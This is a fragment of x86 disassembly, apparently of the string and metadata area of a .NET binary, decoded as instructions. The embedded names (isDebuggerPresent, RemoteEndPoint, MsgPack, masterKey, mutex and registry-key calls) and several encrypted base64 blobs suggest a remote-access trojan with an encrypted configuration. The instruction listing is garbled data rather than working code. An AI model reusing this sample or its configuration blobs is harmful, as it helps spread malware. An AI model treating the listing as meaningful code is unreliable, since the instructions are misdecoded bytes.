  408fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc6:	74 65                	je     0x40902d
  408fc8:	44                   	inc    %esp
  408fc9:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408fcd:	67 65 72 50          	addr16 gs jb 0x409021
  408fd1:	72 65                	jb     0x409038
  408fd3:	73 65                	jae    0x40903a
  408fd5:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd6:	74 00                	je     0x408fd8
  408fd8:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  408fdf:	67 65 72 50          	addr16 gs jb 0x409033
  408fe3:	72 65                	jb     0x40904a
  408fe5:	73 65                	jae    0x40904c
  408fe7:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe8:	74 00                	je     0x408fea
  408fea:	67 65 74 5f          	addr16 gs je 0x40904d
  408fee:	52                   	push   %edx
  408fef:	65 6d                	gs insl (%dx),%es:(%edi)
  408ff1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff2:	74 65                	je     0x409059
  408ff4:	45                   	inc    %ebp
  408ff5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff6:	64 50                	fs push %eax
  408ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff9:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409000:	5f                   	pop    %edi
  409001:	43                   	inc    %ebx
  409002:	6f                   	outsl  %ds:(%esi),(%dx)
  409003:	75 6e                	jne    0x409073
  409005:	74 00                	je     0x409007
  409007:	67 65 74 5f          	addr16 gs je 0x40906a
  40900b:	50                   	push   %eax
  40900c:	72 6f                	jb     0x40907d
  40900e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409011:	73 6f                	jae    0x409082
  409013:	72 43                	jb     0x409058
  409015:	6f                   	outsl  %ds:(%esi),(%dx)
  409016:	75 6e                	jne    0x409086
  409018:	74 00                	je     0x40901a
  40901a:	47                   	inc    %edi
  40901b:	65 74 50             	gs je  0x40906e
  40901e:	61                   	popa
  40901f:	74 68                	je     0x409089
  409021:	52                   	push   %edx
  409022:	6f                   	outsl  %ds:(%esi),(%dx)
  409023:	6f                   	outsl  %ds:(%esi),(%dx)
  409024:	74 00                	je     0x409026
  409026:	44                   	inc    %esp
  409027:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40902b:	70 74                	jo     0x4090a1
  40902d:	00 45 6e             	add    %al,0x6e(%ebp)
  409030:	63 72 79             	arpl   %esi,0x79(%edx)
  409033:	70 74                	jo     0x4090a9
  409035:	00 50 61             	add    %dl,0x61(%eax)
  409038:	72 61                	jb     0x40909b
  40903a:	6d                   	insl   (%dx),%es:(%edi)
  40903b:	65 74 65             	gs je  0x4090a3
  40903e:	72 69                	jb     0x4090a9
  409040:	7a 65                	jp     0x4090a7
  409042:	64 54                	fs push %esp
  409044:	68 72 65 61 64       	push   $0x64616572
  409049:	53                   	push   %ebx
  40904a:	74 61                	je     0x4090ad
  40904c:	72 74                	jb     0x4090c2
  40904e:	00 43 6f             	add    %al,0x6f(%ebx)
  409051:	6e                   	outsb  %ds:(%esi),(%dx)
  409052:	76 65                	jbe    0x4090b9
  409054:	72 74                	jb     0x4090ca
  409056:	00 43 61             	add    %al,0x61(%ebx)
  409059:	73 74                	jae    0x4090cf
  40905b:	00 46 61             	add    %al,0x61(%esi)
  40905e:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409065:	54 
  409066:	6f                   	outsl  %ds:(%esi),(%dx)
  409067:	4c                   	dec    %esp
  409068:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  40906f:	75 74                	jne    0x4090e5
  409071:	00 53 79             	add    %dl,0x79(%ebx)
  409074:	73 74                	jae    0x4090ea
  409076:	65 6d                	gs insl (%dx),%es:(%edi)
  409078:	2e 43                	cs inc %ebx
  40907a:	6f                   	outsl  %ds:(%esi),(%dx)
  40907b:	6c                   	insb   (%dx),%es:(%edi)
  40907c:	6c                   	insb   (%dx),%es:(%edi)
  40907d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409082:	6e                   	outsb  %ds:(%esi),(%dx)
  409083:	73 2e                	jae    0x4090b3
  409085:	49                   	dec    %ecx
  409086:	45                   	inc    %ebp
  409087:	6e                   	outsb  %ds:(%esi),(%dx)
  409088:	75 6d                	jne    0x4090f7
  40908a:	65 72 61             	gs jb  0x4090ee
  40908d:	74 6f                	je     0x4090fe
  40908f:	72 2e                	jb     0x4090bf
  409091:	4d                   	dec    %ebp
  409092:	6f                   	outsl  %ds:(%esi),(%dx)
  409093:	76 65                	jbe    0x4090fa
  409095:	4e                   	dec    %esi
  409096:	65 78 74             	gs js  0x40910d
  409099:	00 53 79             	add    %dl,0x79(%ebx)
  40909c:	73 74                	jae    0x409112
  40909e:	65 6d                	gs insl (%dx),%es:(%edi)
  4090a0:	2e 54                	cs push %esp
  4090a2:	65 78 74             	gs js  0x409119
  4090a5:	00 76 00             	add    %dh,0x0(%esi)
  4090a8:	73 65                	jae    0x40910f
  4090aa:	74 5f                	je     0x40910b
  4090ac:	43                   	inc    %ebx
  4090ad:	72 65                	jb     0x409114
  4090af:	61                   	popa
  4090b0:	74 65                	je     0x409117
  4090b2:	4e                   	dec    %esi
  4090b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4090b4:	57                   	push   %edi
  4090b5:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  4090bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bd:	64 65 78 00          	fs gs js 0x4090c1
  4090c1:	43                   	inc    %ebx
  4090c2:	6c                   	insb   (%dx),%es:(%edi)
  4090c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c4:	73 65                	jae    0x40912b
  4090c6:	4d                   	dec    %ebp
  4090c7:	75 74                	jne    0x40913d
  4090c9:	65 78 00             	gs js  0x4090cc
  4090cc:	43                   	inc    %ebx
  4090cd:	72 65                	jb     0x409134
  4090cf:	61                   	popa
  4090d0:	74 65                	je     0x409137
  4090d2:	4d                   	dec    %ebp
  4090d3:	75 74                	jne    0x409149
  4090d5:	65 78 00             	gs js  0x4090d8
  4090d8:	44                   	inc    %esp
  4090d9:	65 6c                	gs insb (%dx),%es:(%edi)
  4090db:	61                   	popa
  4090dc:	79 00                	jns    0x4090de
  4090de:	57                   	push   %edi
  4090df:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  4090e6:	61                   	popa
  4090e7:	79 00                	jns    0x4090e9
  4090e9:	49                   	dec    %ecx
  4090ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4090eb:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4090f2:	65 
  4090f3:	41                   	inc    %ecx
  4090f4:	72 72                	jb     0x409168
  4090f6:	61                   	popa
  4090f7:	79 00                	jns    0x4090f9
  4090f9:	4d                   	dec    %ebp
  4090fa:	73 67                	jae    0x409163
  4090fc:	50                   	push   %eax
  4090fd:	61                   	popa
  4090fe:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409101:	72 72                	jb     0x409175
  409103:	61                   	popa
  409104:	79 00                	jns    0x409106
  409106:	54                   	push   %esp
  409107:	6f                   	outsl  %ds:(%esi),(%dx)
  409108:	41                   	inc    %ecx
  409109:	72 72                	jb     0x40917d
  40910b:	61                   	popa
  40910c:	79 00                	jns    0x40910e
  40910e:	67 65 74 5f          	addr16 gs je 0x409171
  409112:	41                   	inc    %ecx
  409113:	73 41                	jae    0x409156
  409115:	72 72                	jb     0x409189
  409117:	61                   	popa
  409118:	79 00                	jns    0x40911a
  40911a:	72 65                	jb     0x409181
  40911c:	66 41                	inc    %cx
  40911e:	73 41                	jae    0x409161
  409120:	72 72                	jb     0x409194
  409122:	61                   	popa
  409123:	79 00                	jns    0x409125
  409125:	67 65 74 5f          	addr16 gs je 0x409188
  409129:	4b                   	dec    %ebx
  40912a:	65 79 00             	gs jns 0x40912d
  40912d:	73 65                	jae    0x409194
  40912f:	74 5f                	je     0x409190
  409131:	4b                   	dec    %ebx
  409132:	65 79 00             	gs jns 0x409135
  409135:	43                   	inc    %ebx
  409136:	72 65                	jb     0x40919d
  409138:	61                   	popa
  409139:	74 65                	je     0x4091a0
  40913b:	53                   	push   %ebx
  40913c:	75 62                	jne    0x4091a0
  40913e:	4b                   	dec    %ebx
  40913f:	65 79 00             	gs jns 0x409142
  409142:	44                   	inc    %esp
  409143:	65 6c                	gs insb (%dx),%es:(%edi)
  409145:	65 74 65             	gs je  0x4091ad
  409148:	53                   	push   %ebx
  409149:	75 62                	jne    0x4091ad
  40914b:	4b                   	dec    %ebx
  40914c:	65 79 00             	gs jns 0x40914f
  40914f:	4f                   	dec    %edi
  409150:	70 65                	jo     0x4091b7
  409152:	6e                   	outsb  %ds:(%esi),(%dx)
  409153:	53                   	push   %ebx
  409154:	75 62                	jne    0x4091b8
  409156:	4b                   	dec    %ebx
  409157:	65 79 00             	gs jns 0x40915a
  40915a:	67 65 74 5f          	addr16 gs je 0x4091bd
  40915e:	50                   	push   %eax
  40915f:	75 62                	jne    0x4091c3
  409161:	6c                   	insb   (%dx),%es:(%edi)
  409162:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  409169:	61                   	popa
  40916a:	75 74                	jne    0x4091e0
  40916c:	68 4b 65 79 00       	push   $0x79654b
  409171:	6d                   	insl   (%dx),%es:(%edi)
  409172:	61                   	popa
  409173:	73 74                	jae    0x4091e9
  409175:	65 72 4b             	gs jb  0x4091c3
  409178:	65 79 00             	gs jns 0x40917b
  40917b:	52                   	push   %edx
  40917c:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409183:	4b 65 
  409185:	79 00                	jns    0x409187
  409187:	5f                   	pop    %edi
  409188:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40918c:	53                   	push   %ebx
  40918d:	79 73                	jns    0x409202
  40918f:	74 65                	je     0x4091f6
  409191:	6d                   	insl   (%dx),%es:(%edi)
  409192:	2e 53                	cs push %ebx
  409194:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409198:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40919f:	70 
  4091a0:	74 6f                	je     0x409211
  4091a2:	67 72 61             	addr16 jb 0x409206
  4091a5:	70 68                	jo     0x40920f
  4091a7:	79 00                	jns    0x4091a9
  4091a9:	41                   	inc    %ecx
  4091aa:	73 73                	jae    0x40921f
  4091ac:	65 6d                	gs insl (%dx),%es:(%edi)
  4091ae:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4091b2:	41                   	inc    %ecx
  4091b3:	64 64 72 65          	fs fs jb 0x40921c
  4091b7:	73 73                	jae    0x40922c
  4091b9:	46                   	inc    %esi
  4091ba:	61                   	popa
  4091bb:	6d                   	insl   (%dx),%es:(%edi)
  4091bc:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  4091c3:	63 
  4091c4:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  4091c8:	79 00                	jns    0x4091ca
  4091ca:	57                   	push   %edi
  4091cb:	72 69                	jb     0x409236
  4091cd:	74 65                	je     0x409234
  4091cf:	42                   	inc    %edx
  4091d0:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  4091d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d8:	42                   	inc    %edx
  4091d9:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  4091e0:	65 74 5f             	gs je  0x409242
  4091e3:	53                   	push   %ebx
  4091e4:	79 73                	jns    0x409259
  4091e6:	74 65                	je     0x40924d
  4091e8:	6d                   	insl   (%dx),%es:(%edi)
  4091e9:	44                   	inc    %esp
  4091ea:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4091f1:	79 00                	jns    0x4091f3
  4091f3:	53                   	push   %ebx
  4091f4:	65 74 52             	gs je  0x409249
  4091f7:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  4091fe:	00 6f 
  409200:	70 5f                	jo     0x409261
  409202:	45                   	inc    %ebp
  409203:	71 75                	jno    0x40927a
  409205:	61                   	popa
  409206:	6c                   	insb   (%dx),%es:(%edi)
  409207:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40920e:	49 
  40920f:	6e                   	outsb  %ds:(%esi),(%dx)
  409210:	65 71 75             	gs jno 0x409288
  409213:	61                   	popa
  409214:	6c                   	insb   (%dx),%es:(%edi)
  409215:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  40921c:	74 
  40921d:	65 6d                	gs insl (%dx),%es:(%edi)
  40921f:	2e 4e                	cs dec %esi
  409221:	65 74 2e             	gs je  0x409252
  409224:	53                   	push   %ebx
  409225:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409229:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409230:	64 
  409231:	6f                   	outsl  %ds:(%esi),(%dx)
  409232:	77 73                	ja     0x4092a7
  409234:	49                   	dec    %ecx
  409235:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409238:	74 69                	je     0x4092a3
  40923a:	74 79                	je     0x4092b5
  40923c:	00 49 73             	add    %cl,0x73(%ecx)
  40923f:	4e                   	dec    %esi
  409240:	75 6c                	jne    0x4092ae
  409242:	6c                   	insb   (%dx),%es:(%edi)
  409243:	4f                   	dec    %edi
  409244:	72 45                	jb     0x40928b
  409246:	6d                   	insl   (%dx),%es:(%edi)
  409247:	70 74                	jo     0x4092bd
  409249:	79 00                	jns    0x40924b
  40924b:	00 00                	add    %al,(%eax)
  40924d:	0d 53 00 48 00       	or     $0x480053,%eax
  409252:	41                   	inc    %ecx
  409253:	00 32                	add    %dh,(%edx)
  409255:	00 35 00 36 00 00    	add    %dh,0x3600
  40925b:	80 d9 2f             	sbb    $0x2f,%cl
  40925e:	00 6f 00             	add    %ch,0x0(%edi)
  409261:	58                   	pop    %eax
  409262:	00 30                	add    %dh,(%eax)
  409264:	00 6a 00             	add    %ch,0x0(%edx)
  409267:	41                   	inc    %ecx
  409268:	00 65 00             	add    %ah,0x0(%ebp)
  40926b:	46                   	inc    %esi
  40926c:	00 4f 00             	add    %cl,0x0(%edi)
  40926f:	6d                   	insl   (%dx),%es:(%edi)
  409270:	00 66 00             	add    %ah,0x0(%esi)
  409273:	68 00 35 00 32       	push   $0x32003500
  409278:	00 67 00             	add    %ah,0x0(%edi)
  40927b:	38 00                	cmp    %al,(%eax)
  40927d:	35 00 4d 00 32       	xor    $0x32004d00,%eax
  409282:	00 72 00             	add    %dh,0x0(%edx)
  409285:	6c                   	insb   (%dx),%es:(%edi)
  409286:	00 52 00             	add    %dl,0x0(%edx)
  409289:	79 00                	jns    0x40928b
  40928b:	58                   	pop    %eax
  40928c:	00 61 00             	add    %ah,0x0(%ecx)
  40928f:	56                   	push   %esi
  409290:	00 79 00             	add    %bh,0x0(%ecx)
  409293:	53                   	push   %ebx
  409294:	00 6a 00             	add    %ch,0x0(%edx)
  409297:	32 00                	xor    (%eax),%al
  409299:	76 00                	jbe    0x40929b
  40929b:	5a                   	pop    %edx
  40929c:	00 6d 00             	add    %ch,0x0(%ebp)
  40929f:	4b                   	dec    %ebx
  4092a0:	00 37                	add    %dh,(%edi)
  4092a2:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  4092a6:	00 7a 00             	add    %bh,0x0(%edx)
  4092a9:	62 00                	bound  %eax,(%eax)
  4092ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ac:	00 2b                	add    %ch,(%ebx)
  4092ae:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  4092b2:	00 6e 00             	add    %ch,0x0(%esi)
  4092b5:	72 00                	jb     0x4092b7
  4092b7:	31 00                	xor    %eax,(%eax)
  4092b9:	41                   	inc    %ecx
  4092ba:	00 79 00             	add    %bh,0x0(%ecx)
  4092bd:	4b                   	dec    %ebx
  4092be:	00 65 00             	add    %ah,0x0(%ebp)
  4092c1:	53                   	push   %ebx
  4092c2:	00 34 00             	add    %dh,(%eax,%eax,1)
  4092c5:	6d                   	insl   (%dx),%es:(%edi)
  4092c6:	00 6f 00             	add    %ch,0x0(%edi)
  4092c9:	74 00                	je     0x4092cb
  4092cb:	6a 00                	push   $0x0
  4092cd:	76 00                	jbe    0x4092cf
  4092cf:	35 00 50 00 43       	xor    $0x43005000,%eax
  4092d4:	00 70 00             	add    %dh,0x0(%eax)
  4092d7:	4c                   	dec    %esp
  4092d8:	00 34 00             	add    %dh,(%eax,%eax,1)
  4092db:	73 00                	jae    0x4092dd
  4092dd:	42                   	inc    %edx
  4092de:	00 63 00             	add    %ah,0x0(%ebx)
  4092e1:	48                   	dec    %eax
  4092e2:	00 76 00             	add    %dh,0x0(%esi)
  4092e5:	42                   	inc    %edx
  4092e6:	00 45 00             	add    %al,0x0(%ebp)
  4092e9:	34 00                	xor    $0x0,%al
  4092eb:	46                   	inc    %esi
  4092ec:	00 53 00             	add    %dl,0x0(%ebx)
  4092ef:	41                   	inc    %ecx
  4092f0:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  4092f4:	00 76 00             	add    %dh,0x0(%esi)
  4092f7:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  4092fb:	38 00                	cmp    %al,(%eax)
  4092fd:	70 00                	jo     0x4092ff
  4092ff:	69 00 36 00 4e 00    	imul   $0x4e0036,(%eax),%eax
  409305:	46                   	inc    %esi
  409306:	00 76 00             	add    %dh,0x0(%esi)
  409309:	62 00                	bound  %eax,(%eax)
  40930b:	70 00                	jo     0x40930d
  40930d:	55                   	push   %ebp
  40930e:	00 45 00             	add    %al,0x0(%ebp)
  409311:	55                   	push   %ebp
  409312:	00 62 00             	add    %ah,0x0(%edx)
  409315:	79 00                	jns    0x409317
  409317:	57                   	push   %edi
  409318:	00 52 00             	add    %dl,0x0(%edx)
  40931b:	73 00                	jae    0x40931d
  40931d:	43                   	inc    %ebx
  40931e:	00 36                	add    %dh,(%esi)
  409320:	00 6e 00             	add    %ch,0x0(%esi)
  409323:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409327:	2b 00                	sub    (%eax),%eax
  409329:	4b                   	dec    %ebx
  40932a:	00 2f                	add    %ch,(%edi)
  40932c:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  409330:	00 38                	add    %bh,(%eax)
  409332:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  409338:	6c                   	insb   (%dx),%es:(%edi)
  409339:	00 6e 00             	add    %ch,0x0(%esi)
  40933c:	55                   	push   %ebp
  40933d:	00 79 00             	add    %bh,0x0(%ecx)
  409340:	56                   	push   %esi
  409341:	00 6e 00             	add    %ch,0x0(%esi)
  409344:	52                   	push   %edx
  409345:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  409349:	00 35 00 2f 00 37    	add    %dh,0x37002f00
  40934f:	00 65 00             	add    %ah,0x0(%ebp)
  409352:	55                   	push   %ebp
  409353:	00 5a 00             	add    %bl,0x0(%edx)
  409356:	74 00                	je     0x409358
  409358:	61                   	popa
  409359:	00 52 00             	add    %dl,0x0(%edx)
  40935c:	32 00                	xor    (%eax),%al
  40935e:	55                   	push   %ebp
  40935f:	00 4b 00             	add    %cl,0x0(%ebx)
  409362:	62 00                	bound  %eax,(%eax)
  409364:	37                   	aaa
  409365:	00 77 00             	add    %dh,0x0(%edi)
  409368:	6a 00                	push   $0x0
  40936a:	33 00                	xor    (%eax),%eax
  40936c:	35 00 46 00 75       	xor    $0x75004600,%eax
  409371:	00 31                	add    %dh,(%ecx)
  409373:	00 67 00             	add    %ah,0x0(%edi)
  409376:	6a 00                	push   $0x0
  409378:	41                   	inc    %ecx
  409379:	00 4e 00             	add    %cl,0x0(%esi)
  40937c:	4a                   	dec    %edx
  40937d:	00 43 00             	add    %al,0x0(%ebx)
  409380:	32 00                	xor    (%eax),%al
  409382:	6f                   	outsl  %ds:(%esi),(%dx)
  409383:	00 58 00             	add    %bl,0x0(%eax)
  409386:	32 00                	xor    (%eax),%al
  409388:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40938c:	7a 00                	jp     0x40938e
  40938e:	69 00 30 00 6a 00    	imul   $0x6a0030,(%eax),%eax
  409394:	59                   	pop    %ecx
  409395:	00 50 00             	add    %dl,0x0(%eax)
  409398:	56                   	push   %esi
  409399:	00 79 00             	add    %bh,0x0(%ecx)
  40939c:	4c                   	dec    %esp
  40939d:	00 48 00             	add    %cl,0x0(%eax)
  4093a0:	6c                   	insb   (%dx),%es:(%edi)
  4093a1:	00 55 00             	add    %dl,0x0(%ebp)
  4093a4:	74 00                	je     0x4093a6
  4093a6:	51                   	push   %ecx
  4093a7:	00 58 00             	add    %bl,0x0(%eax)
  4093aa:	67 00 36 00 36       	add    %dh,0x3600
  4093af:	00 45 00             	add    %al,0x0(%ebp)
  4093b2:	72 00                	jb     0x4093b4
  4093b4:	2f                   	das
  4093b5:	00 43 00             	add    %al,0x0(%ebx)
  4093b8:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  4093bc:	45                   	inc    %ebp
  4093bd:	00 75 00             	add    %dh,0x0(%ebp)
  4093c0:	39 00                	cmp    %eax,(%eax)
  4093c2:	32 00                	xor    (%eax),%al
  4093c4:	4c                   	dec    %esp
  4093c5:	00 62 00             	add    %ah,0x0(%edx)
  4093c8:	4c                   	dec    %esp
  4093c9:	00 30                	add    %dh,(%eax)
  4093cb:	00 45 00             	add    %al,0x0(%ebp)
  4093ce:	78 00                	js     0x4093d0
  4093d0:	5a                   	pop    %edx
  4093d1:	00 35 00 36 00 48    	add    %dh,0x48003600
  4093d7:	00 58 00             	add    %bl,0x0(%eax)
  4093da:	31 00                	xor    %eax,(%eax)
  4093dc:	7a 00                	jp     0x4093de
  4093de:	49                   	dec    %ecx
  4093df:	00 43 00             	add    %al,0x0(%ebx)
  4093e2:	67 00 3d             	add    %bh,(%di)
  4093e5:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  4093eb:	51                   	push   %ecx
  4093ec:	00 69 00             	add    %ch,0x0(%ecx)
  4093ef:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  4093f3:	7a 00                	jp     0x4093f5
  4093f5:	74 00                	je     0x4093f7
  4093f7:	31 00                	xor    %eax,(%eax)
  4093f9:	58                   	pop    %eax
  4093fa:	00 41 00             	add    %al,0x0(%ecx)
  4093fd:	74 00                	je     0x4093ff
  4093ff:	57                   	push   %edi
  409400:	00 65 00             	add    %ah,0x0(%ebp)
  409403:	39 00                	cmp    %eax,(%eax)
  409405:	69 00 43 00 50 00    	imul   $0x500043,(%eax),%eax
  40940b:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40940f:	78 00                	js     0x409411
  409411:	36 00 33             	add    %dh,%ss:(%ebx)
  409414:	00 49 00             	add    %cl,0x0(%ecx)
  409417:	42                   	inc    %edx
  409418:	00 68 00             	add    %ch,0x0(%eax)
  40941b:	38 00                	cmp    %al,(%eax)
  40941d:	5a                   	pop    %edx
  40941e:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  409422:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  409426:	00 58 00             	add    %bl,0x0(%eax)
  409429:	38 00                	cmp    %al,(%eax)
  40942b:	45                   	inc    %ebp
  40942c:	00 53 00             	add    %dl,0x0(%ebx)
  40942f:	42                   	inc    %edx
  409430:	00 30                	add    %dh,(%eax)
  409432:	00 49 00             	add    %cl,0x0(%ecx)
  409435:	6a 00                	push   $0x0
  409437:	44                   	inc    %esp
  409438:	00 46 00             	add    %al,0x0(%esi)
  40943b:	46                   	inc    %esi
  40943c:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  409440:	00 7a 00             	add    %bh,0x0(%edx)
  409443:	61                   	popa
  409444:	00 6b 00             	add    %ch,0x0(%ebx)
  409447:	66 00 6c 00 41       	data16 add %ch,0x41(%eax,%eax,1)
  40944c:	00 59 00             	add    %bl,0x0(%ecx)
  40944f:	79 00                	jns    0x409451
  409451:	48                   	dec    %eax
  409452:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  409456:	00 63 00             	add    %ah,0x0(%ebx)
  409459:	4e                   	dec    %esi
  40945a:	00 65 00             	add    %ah,0x0(%ebp)
  40945d:	32 00                	xor    (%eax),%al
  40945f:	70 00                	jo     0x409461
  409461:	32 00                	xor    (%eax),%al
  409463:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  409466:	00 79 00             	add    %bh,0x0(%ecx)
  409469:	53                   	push   %ebx
  40946a:	00 32                	add    %dh,(%edx)
  40946c:	00 72 00             	add    %dh,0x0(%edx)
  40946f:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  409473:	73 00                	jae    0x409475
  409475:	59                   	pop    %ecx
  409476:	00 49 00             	add    %cl,0x0(%ecx)
  409479:	68 00 78 00 70       	push   $0x70007800
  40947e:	00 4f 00             	add    %cl,0x0(%edi)
  409481:	57                   	push   %edi
  409482:	00 61 00             	add    %ah,0x0(%ecx)
  409485:	77 00                	ja     0x409487
  409487:	42                   	inc    %edx
  409488:	00 6e 00             	add    %ch,0x0(%esi)
  40948b:	63 00                	arpl   %eax,(%eax)
  40948d:	56                   	push   %esi
  40948e:	00 58 00             	add    %bl,0x0(%eax)
  409491:	4e                   	dec    %esi
  409492:	00 4f 00             	add    %cl,0x0(%edi)
  409495:	77 00                	ja     0x409497
  409497:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40949c:	80 b1 55 00 5a 00 6f 	xorb   $0x6f,0x5a0055(%ecx)
  4094a3:	00 36                	add    %dh,(%esi)
  4094a5:	00 49 00             	add    %cl,0x0(%ecx)
  4094a8:	46                   	inc    %esi
  4094a9:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  4094ad:	00 6f 00             	add    %ch,0x0(%edi)
  4094b0:	75 00                	jne    0x4094b2
  4094b2:	47                   	inc    %edi
  4094b3:	00 33                	add    %dh,(%ebx)
  4094b5:	00 48 00             	add    %cl,0x0(%eax)
  4094b8:	51                   	push   %ecx
  4094b9:	00 38                	add    %bh,(%eax)
  4094bb:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  4094bf:	00 4b 00             	add    %cl,0x0(%ebx)
  4094c2:	37                   	aaa
  4094c3:	00 33                	add    %dh,(%ebx)
  4094c5:	00 6b 00             	add    %ch,0x0(%ebx)
  4094c8:	61                   	popa
  4094c9:	00 31                	add    %dh,(%ecx)
  4094cb:	00 4f 00             	add    %cl,0x0(%edi)
  4094ce:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  4094d2:	4d                   	dec    %ebp
  4094d3:	00 30                	add    %dh,(%eax)
  4094d5:	00 6f 00             	add    %ch,0x0(%edi)
  4094d8:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  4094dc:	37                   	aaa
  4094dd:	00 76 00             	add    %dh,0x0(%esi)
  4094e0:	2f                   	das
  4094e1:	00 47 00             	add    %al,0x0(%edi)
  4094e4:	51                   	push   %ecx
  4094e5:	00 46 00             	add    %al,0x0(%esi)
  4094e8:	6b 00 53             	imul   $0x53,(%eax),%eax
  4094eb:	00 73 00             	add    %dh,0x0(%ebx)
  4094ee:	70 00                	jo     0x4094f0
  4094f0:	75 00                	jne    0x4094f2
  4094f2:	47                   	inc    %edi
  4094f3:	00 30                	add    %dh,(%eax)
  4094f5:	00 50 00             	add    %dl,0x0(%eax)
  4094f8:	47                   	inc    %edi
  4094f9:	00 46 00             	add    %al,0x0(%esi)
  4094fc:	62 00                	bound  %eax,(%eax)
  4094fe:	72 00                	jb     0x409500
  409500:	4f                   	dec    %edi
  409501:	00 72 00             	add    %dh,0x0(%edx)
  409504:	6d                   	insl   (%dx),%es:(%edi)
  409505:	00 77 00             	add    %dh,0x0(%edi)
  409508:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40950c:	77 00                	ja     0x40950e
  40950e:	42                   	inc    %edx
  40950f:	00 38                	add    %bh,(%eax)
  409511:	00 34 00             	add    %dh,(%eax,%eax,1)
  409514:	74 00                	je     0x409516
  409516:	75 00                	jne    0x409518
  409518:	6d                   	insl   (%dx),%es:(%edi)
  409519:	00 6a 00             	add    %ch,0x0(%edx)
  40951c:	58                   	pop    %eax
  40951d:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  409521:	00 2b                	add    %ch,(%ebx)
  409523:	00 32                	add    %dh,(%edx)
  409525:	00 35 00 6f 00 5a    	add    %dh,0x5a006f00
  40952b:	00 67 00             	add    %ah,0x0(%edi)
  40952e:	76 00                	jbe    0x409530
  409530:	69 00 54 00 63 00    	imul   $0x630054,(%eax),%eax
  409536:	4e                   	dec    %esi
  409537:	00 41 00             	add    %al,0x0(%ecx)
  40953a:	49                   	dec    %ecx
  40953b:	00 77 00             	add    %dh,0x0(%edi)
  40953e:	38 00                	cmp    %al,(%eax)
  409540:	6a 00                	push   $0x0
  409542:	74 00                	je     0x409544
  409544:	4f                   	dec    %edi
  409545:	00 41 00             	add    %al,0x0(%ecx)
  409548:	77 00                	ja     0x40954a
  40954a:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40954f:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409555:	00 70 00             	add    %dh,0x0(%eax)
  409558:	44                   	inc    %esp
